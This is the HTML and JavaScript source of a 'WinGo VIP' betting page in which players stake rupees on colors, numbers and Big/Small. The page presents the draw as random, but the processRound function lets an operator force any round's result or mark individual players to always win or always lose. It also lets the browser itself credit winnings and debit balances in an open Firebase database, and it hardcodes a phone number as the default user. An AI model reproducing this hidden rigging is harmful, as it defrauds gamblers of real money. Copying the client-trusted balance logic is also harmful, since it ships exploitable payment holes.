<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>WinGo VIP - Global 24/7</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --p-red: #ff4d4d; --p-green: #4cd964; --p-violet: #b666d2; --theme-grad: linear-gradient(135deg, #ff4d4d, #f12711); }
        body { background: #f0f2f5; font-family: 'Poppins', sans-serif; margin: 0; user-select: none; }
        
        #lockOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 9999; display: none; flex-direction: column; align-items: center; justify-content: center; backdrop-filter: blur(8px); color: white; }
        #resultPopup { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0); z-index: 10000; transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); pointer-events: none; }
        #resultPopup.show { transform: translate(-50%, -50%) scale(1); pointer-events: auto; }
        .res-card { width: 280px; padding: 25px; border-radius: 20px; text-align: center; color: white; box-shadow: 0 10px 40px rgba(0,0,0,0.5); }
        .res-card.win { background: linear-gradient(135deg, #f1c40f, #f39c12); }
        .res-card.loss { background: linear-gradient(135deg, #95a5a6, #7f8c8d); }

        .header { background: var(--theme-grad); padding: 20px; color: white; border-bottom-left-radius: 25px; border-bottom-right-radius: 25px; }
        .wallet-box { background: rgba(255,255,255,0.15); padding: 15px; border-radius: 15px; margin-top: 15px; border: 1px solid rgba(255,255,255,0.2); }
        .action-btns { display: flex; gap: 10px; margin-top: 15px; }
        .a-btn { flex: 1; padding: 10px; border-radius: 8px; border: none; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 5px; }
        .dep-btn { background: #fff; color: #f12711; }
        .wit-btn { background: rgba(0,0,0,0.2); color: #fff; border: 1px solid rgba(255,255,255,0.3); }

        .mode-container { display: flex; background: white; margin: 10px; border-radius: 12px; overflow: hidden; }
        .mode-tab { flex: 1; padding: 15px; text-align: center; font-weight: bold; cursor: pointer; color: #999; }
        .mode-tab.active { color: var(--p-red); border-bottom: 3px solid var(--p-red); }
        .timer-card { background: white; margin: 15px; padding: 20px; border-radius: 20px; display: flex; justify-content: space-between; align-items: center; }
        
        .btn-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 10px; margin: 15px; }
        .n-btn { height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; cursor: pointer; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
        .c-btn { flex: 1; padding: 15px; border-radius: 10px; color: white; font-weight: bold; border: none; cursor: pointer; }

        #bettingPanel { position: fixed; bottom: -100%; left: 0; width: 100%; background: white; z-index: 2000; border-radius: 25px 25px 0 0; transition: 0.4s; padding: 25px; box-sizing: border-box; box-shadow: 0 -5px 20px rgba(0,0,0,0.1); }
        #bettingPanel.show { bottom: 0; }
        .amt-ctrl { display: flex; align-items: center; justify-content: center; gap: 15px; margin: 15px 0; }
        .amt-ctrl button { width: 40px; height: 40px; border-radius: 50%; border: 1px solid #ddd; background: white; font-size: 20px; cursor: pointer; }
        .amt-ctrl input { width: 100px; text-align: center; border: 1px solid #eee; font-size: 22px; font-weight: bold; border-radius: 5px; }
        .mul-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-bottom: 20px; }
        .mul-btn { background: #f5f5f5; padding: 8px; border-radius: 5px; text-align: center; font-size: 13px; cursor: pointer; font-weight: bold; }
        .mul-btn.active { background: var(--p-red); color: white; }

        .history-card { background: white; margin: 15px; border-radius: 20px; overflow: hidden; padding-bottom: 10px; }
        table { width: 100%; text-align: center; border-collapse: collapse; font-size: 13px; }
        th { padding: 12px; background: #f8f9fa; color: #777; }
        td { padding: 12px; border-bottom: 1px solid #eee; }

        .pagination { display: flex; justify-content: center; align-items: center; gap: 15px; padding: 15px; background: #fafafa; }
        .p-btn { padding: 5px 12px; border: 1px solid #ddd; background: #fff; border-radius: 4px; cursor: pointer; }
        .p-btn:disabled { opacity: 0.5; cursor: not-allowed; }
    </style>
</head>
<body>

    <div id="lockOverlay"><div style="font-size: 80px; font-weight: bold;" id="lockTimer">5</div><div>WAITING FOR NEXT ROUND...</div></div>

    <div id="resultPopup">
        <div id="resCard" class="res-card">
            <h2 id="resStatus">Result</h2>
            <div id="resAmt" style="font-size:35px; font-weight:bold; margin:10px 0;">₹0.00</div>
            <button onclick="document.getElementById('resultPopup').classList.remove('show')" style="padding:10px 30px; border-radius:20px; border:none; font-weight:bold; cursor:pointer;">CLOSE</button>
        </div>
    </div>

    <div class="header">
        <div style="display:flex; justify-content:space-between; align-items:center;">
            <i class="fas fa-chevron-left" onclick="history.back()"></i>
            <span style="font-weight:bold; font-size:18px;">WinGo VIP <span id="mTitle">1</span>M</span>
            <i class="fas fa-headset"></i>
        </div>
        <div class="wallet-box">
            <small>Total Balance</small>
            <div style="font-size:26px; font-weight:bold;">₹<span id="uBalance">0.00</span></div>
            <div class="action-btns">
                <button class="a-btn dep-btn" onclick="location.href='deposit.html'"><i class="fas fa-plus-circle"></i> Deposit</button>
                <button class="a-btn wit-btn" onclick="location.href='withdraw.html'"><i class="fas fa-wallet"></i> Withdraw</button>
            </div>
        </div>
    </div>

    <div class="mode-container">
        <div id="m1" class="mode-tab active" onclick="switchMode(1)">1Min</div>
        <div id="m3" class="mode-tab" onclick="switchMode(3)">3Min</div>
        <div id="m5" class="mode-tab" onclick="switchMode(5)">5Min</div>
    </div>

    <div class="timer-card">
        <div><small style="color:#999;">Period</small><br><b id="periodId" style="font-size:16px;">--</b></div>
        <div style="text-align:right;"><small style="color:#999;">Count Down</small><br><div id="mainTimer" style="font-size:24px; font-weight:bold; color:var(--p-red);">00:00</div></div>
    </div>

    <div style="display:flex; gap:10px; margin:15px;">
        <button onclick="openBet('Green')" class="c-btn" style="background:var(--p-green)">Green</button>
        <button onclick="openBet('Violet')" class="c-btn" style="background:var(--p-violet)">Violet</button>
        <button onclick="openBet('Red')" class="c-btn" style="background:var(--p-red)">Red</button>
    </div>

    <div class="btn-grid" id="numberGrid">
        <div onclick="openBet(0)" class="n-btn" style="background:linear-gradient(135deg, var(--p-violet) 50%, var(--p-red) 50%)">0</div>
        <div onclick="openBet(1)" class="n-btn" style="background:var(--p-green)">1</div>
        <div onclick="openBet(2)" class="n-btn" style="background:var(--p-red)">2</div>
        <div onclick="openBet(3)" class="n-btn" style="background:var(--p-green)">3</div>
        <div onclick="openBet(4)" class="n-btn" style="background:var(--p-red)">4</div>
        <div onclick="openBet(5)" class="n-btn" style="background:linear-gradient(135deg, var(--p-violet) 50%, var(--p-green) 50%)">5</div>
        <div onclick="openBet(6)" class="n-btn" style="background:var(--p-red)">6</div>
        <div onclick="openBet(7)" class="n-btn" style="background:var(--p-green)">7</div>
        <div onclick="openBet(8)" class="n-btn" style="background:var(--p-red)">8</div>
        <div onclick="openBet(9)" class="n-btn" style="background:var(--p-green)">9</div>
    </div>

    <div style="display:flex; gap:10px; margin:15px;">
        <button onclick="openBet('Big')" class="c-btn" style="background:#ffa500">Big</button>
        <button onclick="openBet('Small')" class="c-btn" style="background:#4b0082">Small</button>
    </div>

    <div id="bettingPanel">
        <h3 id="targetLabel" style="text-align:center; margin-bottom:10px;">Bet</h3>
        <div class="mul-grid">
            <div class="mul-btn active" onclick="setBase(1)">1x</div>
            <div class="mul-btn" onclick="setBase(10)">10x</div>
            <div class="mul-btn" onclick="setBase(100)">100x</div>
            <div class="mul-btn" onclick="setBase(1000)">1000x</div>
        </div>
        <div class="amt-ctrl">
            <button onclick="adjustAmt(-1)">-</button>
            <input type="number" id="betAmtInput" value="1" oninput="updateTotal()">
            <button onclick="adjustAmt(1)">+</button>
        </div>
        <button onclick="confirmBet()" style="width:100%; padding:18px; border-radius:15px; border:none; background:var(--theme-grad); color:white; font-weight:bold; font-size:16px;">CONFIRM ₹<span id="totalPrice">1</span></button>
        <p onclick="closeBet()" style="text-align:center; margin-top:15px; color:#999; cursor:pointer;">CANCEL</p>
    </div>

    <div class="history-card">
        <div style="display:flex; border-bottom:1px solid #eee;">
            <div id="ghTab" class="mode-tab active" onclick="toggleHistory('game')">Game History</div>
            <div id="mhTab" class="mode-tab" onclick="toggleHistory('my')">My History</div>
        </div>
        
        <div id="gameBox">
            <table id="gameTable">
                <thead><tr><th>Period</th><th>Num</th><th>Size</th><th>Color</th></tr></thead>
                <tbody id="gameHistory"></tbody>
            </table>
            <div class="pagination">
                <button class="p-btn" id="gPrev" onclick="movePage('game', -1)"><i class="fas fa-chevron-left"></i></button>
                <span id="gPage">1</span>
                <button class="p-btn" id="gNext" onclick="movePage('game', 1)"><i class="fas fa-chevron-right"></i></button>
            </div>
        </div>

        <div id="myBox" style="display:none;">
            <table id="myTable">
                <thead><tr><th>Period</th><th>Bet</th><th>Amt</th><th>Status</th></tr></thead>
                <tbody id="myBets"></tbody>
            </table>
            <div class="pagination">
                <button class="p-btn" id="mPrev" onclick="movePage('my', -1)"><i class="fas fa-chevron-left"></i></button>
                <span id="mPage">1</span>
                <button class="p-btn" id="mNext" onclick="movePage('my', 1)"><i class="fas fa-chevron-right"></i></button>
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, onValue, push, get, update, query, limitToLast, increment, orderByKey } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const fbConfig = { databaseURL: "https://testing-26b8c-default-rtdb.firebaseio.com" };
        const app = initializeApp(fbConfig);
        const db = getDatabase(app);
        const userPhone = localStorage.getItem('userPhone') || '9117748052';

        let currentMode = 1, currentBalance = 0, selected = "", baseMul = 1;
        let gamePage = 1, myPage = 1;
        let allGameData = [], allMyData = [];

        // --- TIMER ---
        setInterval(async () => {
            const now = new Date();
            const totalSec = (currentMode * 60) - (now.getMinutes() % currentMode * 60 + now.getSeconds());
            document.getElementById('mainTimer').innerText = `0${Math.floor(totalSec/60)}:${String(totalSec%60).padStart(2,'0')}`;
            if(totalSec <= 5) { document.getElementById('lockOverlay').style.display = 'flex'; closeBet(); } 
            else { document.getElementById('lockOverlay').style.display = 'none'; }
            if(totalSec === (currentMode * 60)) { processRound(); }
        }, 1000);

        async function processRound() {
            const period = document.getElementById('periodId').innerText;
            const adminRig = await get(ref(db, `adminControl/forceResult/${currentMode}`));
            const userRig = await get(ref(db, `adminControl/rigging/${userPhone}`));
            const myBetSnap = await get(ref(db, `activeBets/${currentMode}/${userPhone}`));

            let finalNum;
            // Admin Rigging Logic
            if(adminRig.exists()) {
                finalNum = parseInt(adminRig.val());
            } else if(userRig.exists() && myBetSnap.exists()) {
                const rigType = userRig.val(); // 'win' or 'loss'
                finalNum = rigType === 'win' ? getWinningNumber(myBetSnap.val().type) : getLosingNumber(myBetSnap.val().type);
            } else {
                finalNum = Math.floor(Math.random() * 10);
            }

            const res = {
                period, number: finalNum,
                color: (finalNum === 0 ? 'Red-Violet' : (finalNum === 5 ? 'Green-Violet' : (finalNum % 2 === 0 ? 'Red' : 'Green'))),
                size: finalNum >= 5 ? 'Big' : 'Small'
            };
            await push(ref(db, `wingoHistory/${currentMode}`), res);

            if(myBetSnap.exists()) {
                const b = myBetSnap.val();
                let isWin = checkWin(b.type, finalNum);
                let mult = getWinMultiplier(b.type, finalNum);
                const winAmt = isWin ? (b.amount * mult) : 0;
                if(isWin) await update(ref(db, `users/${userPhone}`), { balance: increment(winAmt) });
                await update(ref(db, `userBets/${userPhone}/${b.hKey}`), { status: isWin ? 'win' : 'loss', winAmt: winAmt });
                showResult(isWin, winAmt);
            }
            set(ref(db, `activeBets/${currentMode}/${userPhone}`), null);
            // Admin Force Reset after use
            set(ref(db, `adminControl/forceResult/${currentMode}`), null);
        }

        // --- LOGIC HELPERS ---
        function getWinningNumber(t) {
            if(typeof t === 'number') return t;
            if(t==='Green') return [1,3,7,9][Math.floor(Math.random()*4)];
            if(t==='Red') return [2,4,6,8][Math.floor(Math.random()*4)];
            if(t==='Big') return [6,7,8,9][Math.floor(Math.random()*4)];
            if(t==='Small') return [1,2,3,4][Math.floor(Math.random()*4)];
            return 5;
        }
        function getLosingNumber(t) {
            let n; do { n = Math.floor(Math.random()*10); } while(checkWin(t, n)); return n;
        }
        function checkWin(type, num) {
            if(typeof type === 'number') return type === num;
            if(type === 'Green') return [1,3,7,9,5].includes(num);
            if(type === 'Red') return [2,4,6,8,0].includes(num);
            if(type === 'Big') return num >= 5;
            if(type === 'Small') return num < 5;
            if(type === 'Violet') return [0,5].includes(num);
            return false;
        }
        function getWinMultiplier(type, num) {
            if(typeof type === 'number') return 8.82;
            if(type === 'Violet') return 4.41;
            if((type === 'Red' && num === 0) || (type === 'Green' && num === 5)) return 1.47;
            return 1.96;
        }

        // --- PAGINATION & HISTORY ---
        window.movePage = (type, dir) => {
            if(type === 'game') { gamePage = Math.max(1, gamePage + dir); renderGameHistory(); }
            else { myPage = Math.max(1, myPage + dir); renderMyHistory(); }
        };

        function renderGameHistory() {
            const start = (gamePage - 1) * 10;
            const data = allGameData.slice(start, start + 10);
            const b = document.getElementById('gameHistory'); b.innerHTML = "";
            data.forEach(d => {
                b.insertAdjacentHTML('beforeend', `<tr><td>${d.period}</td><td style="font-weight:bold; color:var(--p-red)">${d.number}</td><td>${d.size}</td><td>${d.color}</td></tr>`);
            });
            document.getElementById('gPage').innerText = gamePage;
            document.getElementById('gNext').disabled = (start + 10 >= allGameData.length);
        }

        function renderMyHistory() {
            const start = (myPage - 1) * 10;
            const data = allMyData.slice(start, start + 10);
            const b = document.getElementById('myBets'); b.innerHTML = "";
            data.forEach(d => {
                b.insertAdjacentHTML('beforeend', `<tr><td>${d.period}</td><td>${d.type}</td><td>₹${d.amount}</td><td style="color:${d.status==='win'?'#4cd964':'#ff4d4d'}">${d.status}</td></tr>`);
            });
            document.getElementById('mPage').innerText = myPage;
            document.getElementById('mNext').disabled = (start + 10 >= allMyData.length);
        }

        function loadHistory() {
            onValue(query(ref(db, `wingoHistory/${currentMode}`)), s => {
                allGameData = [];
                s.forEach(c => allGameData.unshift(c.val()));
                renderGameHistory();
                if(allGameData[0]) document.getElementById('periodId').innerText = parseInt(allGameData[0].period)+1;
            });
            onValue(query(ref(db, `userBets/${userPhone}`)), s => {
                allMyData = [];
                s.forEach(c => { if(c.val().mode == currentMode) allMyData.unshift(c.val()); });
                renderMyHistory();
            });
        }

        // --- UI ACTIONS ---
        window.setBase = (v) => { baseMul = v; document.querySelectorAll('.mul-btn').forEach(b => b.classList.toggle('active', b.innerText === v+'x')); updateTotal(); };
        window.adjustAmt = (v) => { let i = document.getElementById('betAmtInput'); i.value = Math.max(1, parseInt(i.value) + v); updateTotal(); };
        window.updateTotal = () => document.getElementById('totalPrice').innerText = (parseInt(document.getElementById('betAmtInput').value) || 1) * baseMul;
        window.switchMode = (m) => { currentMode = m; gamePage = 1; myPage = 1; document.querySelectorAll('.mode-tab').forEach(t => t.classList.remove('active')); document.getElementById('m'+m).classList.add('active'); document.getElementById('mTitle').innerText = m; loadHistory(); };
        window.openBet = (t) => { selected = t; document.getElementById('targetLabel').innerText = "Bet on " + t; document.getElementById('bettingPanel').classList.add('show'); };
        window.closeBet = () => document.getElementById('bettingPanel').classList.remove('show');
        window.toggleHistory = (t) => { document.getElementById('gameBox').style.display = t==='game'?'block':'none'; document.getElementById('myBox').style.display = t==='my'?'block':'none'; document.getElementById('ghTab').classList.toggle('active', t==='game'); document.getElementById('mhTab').classList.toggle('active', t==='my'); };

        window.confirmBet = async () => {
            const total = parseInt(document.getElementById('totalPrice').innerText);
            if(total > currentBalance) return alert("Insufficient Balance!");
            const hRef = push(ref(db, `userBets/${userPhone}`));
            await update(ref(db, `users/${userPhone}`), { balance: increment(-total) });
            await set(hRef, { period: document.getElementById('periodId').innerText, type: selected, amount: total, status: 'pending', mode: currentMode, time: Date.now() });
            await set(ref(db, `activeBets/${currentMode}/${userPhone}`), { amount: total, type: selected, hKey: hRef.key });
            closeBet();
        };

        function showResult(win, amt) {
            const card = document.getElementById('resCard'); card.className = "res-card " + (win ? "win" : "loss");
            document.getElementById('resStatus').innerText = win ? "CONGRATULATIONS" : "BET LOST";
            document.getElementById('resAmt').innerText = win ? "+₹"+amt.toFixed(2) : "-₹0.00";
            document.getElementById('resultPopup').classList.add('show');
        }

        onValue(ref(db, `users/${userPhone}/balance`), s => { currentBalance = s.val() || 0; document.getElementById('uBalance').innerText = currentBalance.toFixed(2); });
        loadHistory();
    </script>
</body>
</html>
